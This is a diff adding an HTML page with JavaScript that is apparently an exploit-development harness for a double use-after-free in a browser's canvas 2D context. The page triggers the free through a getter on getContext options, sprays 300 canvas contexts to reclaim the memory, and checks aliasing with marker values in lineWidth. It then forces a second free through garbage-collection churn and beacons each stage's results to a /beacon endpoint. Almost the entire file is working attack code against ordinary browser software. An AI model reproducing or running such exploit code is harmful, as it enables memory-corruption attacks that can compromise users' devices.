@@ -1,0 +1,91 @@
+<!-- D2 double-UAF discriminator, device-run 14.10 Guide Oct 23 (cobrajet bench).
+<!-- Beacon convention: /beacon/VD2-<TAG>?d=<payload> (triple-burst). Find free-detection caveats in pastawithpesto #18 6379267112. -->
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-store">
+<title>DBLUAF</title></head>
+<body><pre id="out">DBLUAF</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/VD2-'+tag+'?d='+encodeURIComponent(String(body).slice(0,300))+'&t=';
+  function f(){try{new Image().src=u+Date.now();}catch(e){}}
+  f();setTimeout(f,300);setTimeout(f,900);
+}
+var MARKER=7777.77, WRITEV=9999.99, MARKER2=8888.88;
+bk('BOOT','dbl-uaf v1');
+
+/* ===== UAF#1 on canvas A — v573 verbatim ===== */
+var innerA=null;
+function triggerUAF(){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    var ctx=c.getContext('2d');
+    innerA=ctx;
+    for(var s=0;s<32;s++) ctx.save();
+    ctx.lineWidth=1.0;
+    return true;
+  }});
+  c.getContext('bitmaprenderer',d);
+  return c;
+}
+var outerC=triggerUAF();
+bk('UAF1','inner='+(innerA?'OK':'NULL'));
+
+/* ===== Spray same-type reclaim ===== */
+var spC=[],spX=[];
+for(var i=0;i<300;i++){
+  var sc=document.createElement('canvas');
+  sc.width=1;sc.height=1;
+  var sctx=sc.getContext('2d');
+  if(sctx){sctx.lineWidth=MARKER;spC.push(sc);spX.push(sctx);}
+}
+bk('SPRAY','n='+spX.length);
+
+/* ===== Confirm reclaim#1 + identify reclaimer ===== */
+var idx=-1,readOK=false;
+try{
+  var lw1=innerA.lineWidth;
+  bk('READ1','lw='+lw1);
+  if(lw1===MARKER){
+    innerA.lineWidth=WRITEV;
+    for(var j=0;j<spX.length;j++){
+      if(spX[j].lineWidth===WRITEV){idx=j;break;}
+    }
+    bk('ALIAS','idx='+idx);
+    readOK=(idx>=0);
+  }
+}catch(e){bk('READ1','ERR|'+e.name);}
+if(!readOK){bk('ABORT','no-reclaim1');throw new Error('abort');}
+
+/* ===== FREE#2 via DESTROY (BMR getter can't re-arm: canvas locks context type) =====
+   v527-spec owner free: drop element + both wrappers, churn GC without touching
+   the 768-class. */
+bk('UAF2','pre-destroy');
+try{
+  var victim=spC[idx];
+  spC[idx]=null; spX[idx]=null;
+  victim=null;
+  try{var j=[];for(var k=0;k<6;k++)j.push(new Float64Array(4*1024*1024));bk('GCCHURN','done n='+j.length);j=null;}
+  catch(eX){bk('GCCHURN','ERR|'+eX.name);}
+}catch(e4){bk('UAF2','ERR|'+e4.name);}
+setTimeout(function(){
+bk('UAF2','destroyed');
+/* ===== READS after second trigger ===== */
+try{
+  bk('A-LW','lw='+innerA.lineWidth);
+}catch(e5){bk('A-LW','ERR|'+e5.name);}
+try{
+  bk('B-LW','dropped');
+}catch(e6){bk('B-LW','ERR|'+e6.name);}
+try{
+  bk('A-TX','a='+(innerA.getTransform().a));
+}catch(e7){bk('A-TX','ERR|'+e7.name);}
+bk('DONE','complete');
+say('complete');
+},600);
+</script></body></html>
